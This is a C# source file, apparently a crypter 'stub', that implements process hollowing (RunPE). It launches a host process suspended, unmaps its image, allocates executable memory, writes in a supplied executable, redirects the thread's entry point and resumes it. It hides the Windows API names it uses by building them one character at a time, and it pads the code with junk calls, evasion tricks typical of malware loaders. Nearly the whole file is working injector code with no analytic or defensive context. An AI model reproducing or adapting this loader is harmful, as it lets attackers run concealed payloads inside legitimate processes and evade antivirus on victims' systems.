using System;
using System.Runtime.InteropServices;

namespace Stub;

public class BestClass
{
	private delegate bool CP(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, int[] lpProcessInfo);

	private delegate IntPtr VAE(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, uint nndPreferred);

	private delegate bool GTC(IntPtr hThread, IntPtr lpContext);

	private delegate bool WPM(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);

	private delegate uint RT(IntPtr hThread, IntPtr SuspendCount);

	private delegate uint NUVS(IntPtr hProcess, IntPtr lpBaseAddress);

	private delegate bool STC(IntPtr hThread, IntPtr lpContext);

	private const uint IMAGE_NT_SIGNATURE = 17744u;

	private const ushort IMAGE_DOS_SIGNATURE = 23117;

	private const int PAGE_EXECUTE_READWRITE = 64;

	private const int MEM_RESERVE = 8192;

	private const uint CONTEXT_FULL = 65543u;

	private const int MEM_COMMIT = 4096;

	private const int CREATE_SUSPENDED = 4;

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern IntPtr LoadLibraryA([In][MarshalAs(UnmanagedType.LPStr)] string lpFileName);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	public T NewAPI<T>(string name, string method)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(name), method), typeof(T));
	}

	public unsafe bool Run(byte[] exeBuffer, string hostProcess)
	{
		string name = Convert.ToString('n') + 't' + 'd' + 'l' + 'l';
		string name2 = Convert.ToString('k') + 'e' + 'r' + 'n' + 'e' + 'l' + '3' + '2';
		RT rT = NewAPI<RT>(name2, Convert.ToString('R') + 'e' + 's' + 'u' + 'm' + 'e' + 'T' + 'h' + 'r' + 'e' + 'a' + 'd');
		STC sTC = NewAPI<STC>(name2, Convert.ToString('S') + 'e' + 't' + 'T' + 'h' + 'r' + 'e' + 'a' + 'd' + 'C' + 'o' + 'n' + 't' + 'e' + 'x' + 't');
		GTC gTC = NewAPI<GTC>(name2, Convert.ToString('G') + 'e' + 't' + 'T' + 'h' + 'r' + 'e' + 'a' + 'd' + 'C' + 'o' + 'n' + 't' + 'e' + 'x' + 't');
		WPM wPM = NewAPI<WPM>(name2, Convert.ToString('W') + 'r' + 'i' + 't' + 'e' + 'P' + 'r' + 'o' + 'c' + 'e' + 's' + 's' + 'M' + 'e' + 'm' + 'o' + 'r' + 'y');
		NUVS nUVS = NewAPI<NUVS>(name, Convert.ToString('N') + 't' + 'U' + 'n' + 'm' + 'a' + 'p' + 'V' + 'i' + 'e' + 'w' + 'O' + 'f' + 'S' + 'e' + 'c' + 't' + 'i' + 'o' + 'n');
		VAE vAE = NewAPI<VAE>(name2, "VirtualAllocExNuma");
		CP cP = NewAPI<CP>(name2, "CreateProcessA");
		byte[] array = new byte[716];
		int[] array2 = new int[4];
		byte[] array3 = new byte[64];
		byte[] array4 = new byte[248];
		byte[] array5 = new byte[40];
		fixed (byte* ptr = &array[0])
		{
		}
		fixed (byte* ptr2 = &array3[0])
		{
		}
		fixed (byte* ptr3 = &array4[0])
		{
		}
		fixed (byte* ptr4 = &array5[0])
		{
		}
		HowTimeStamp();
		Array.Copy(exeBuffer, array3, array3.Length);
		HowTimeStamp();
		*(int*)ptr = 65543;
		HowTimeStamp();
		int num = *(int*)(ptr2 + 60);
		HowTimeStamp();
		HowTimeStamp();
		Array.Copy(exeBuffer, num, array4, 0, array4.Length);
		HowTimeStamp();
		HowTimeStamp();
		if (!cP(null, hostProcess, IntPtr.Zero, IntPtr.Zero, bInheritHandles: false, 4u, IntPtr.Zero, null, new byte[68], array2))
		{
			return false;
		}
		HowTimeStamp();
		IntPtr intPtr = new IntPtr(*(int*)(ptr3 + 52));
		HowTimeStamp();
		nUVS((IntPtr)array2[0], intPtr);
		HowTimeStamp();
		if (vAE((IntPtr)array2[0], intPtr, *(uint*)(ptr3 + 80), 12288u, 64u, 0u) == IntPtr.Zero)
		{
			Run(exeBuffer, hostProcess);
		}
		HowTimeStamp();
		fixed (byte* ptr5 = &exeBuffer[0])
		{
			wPM((IntPtr)array2[0], intPtr, (IntPtr)ptr5, *(uint*)(ptr3 + 84), IntPtr.Zero);
		}
		HowTimeStamp();
		for (ushort num2 = 0; num2 < *(ushort*)(ptr3 + 6); num2 = (ushort)(num2 + 1))
		{
			Array.Copy(exeBuffer, num + array4.Length + array5.Length * num2, array5, 0, array5.Length);
			HowTimeStamp();
			fixed (byte* ptr6 = &exeBuffer[*(uint*)(ptr4 + 20)])
			{
				wPM((IntPtr)array2[0], (IntPtr)((int)intPtr + (uint)(*(int*)(ptr4 + 12))), (IntPtr)ptr6, *(uint*)(ptr4 + 16), IntPtr.Zero);
			}
			HowTimeStamp();
		}
		gTC((IntPtr)array2[1], (IntPtr)ptr);
		HowTimeStamp();
		wPM((IntPtr)array2[0], (IntPtr)(uint)(*(int*)(ptr + 172)), intPtr, 4u, IntPtr.Zero);
		HowTimeStamp();
		*(int*)(ptr + 176) = (int)intPtr + (int)(*(uint*)(ptr3 + 40));
		HowTimeStamp();
		sTC((IntPtr)array2[1], (IntPtr)ptr);
		HowTimeStamp();
		rT((IntPtr)array2[1], IntPtr.Zero);
		HowTimeStamp();
		return true;
	}

	private void TrashCode()
	{
		char[] array = new char[573];
		for (int i = 0; i <= array.Length - 1; i++)
		{
			Random random = new Random();
			array[i] = Convert.ToChar(random.Next(1, 90));
		}
	}

	public string Reverse(string s)
	{
		char[] array = s.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public string HowTimeStamp()
	{
		string text = null;
		text = DateTime.UtcNow.ToString();
		return Reverse(text);
	}
}
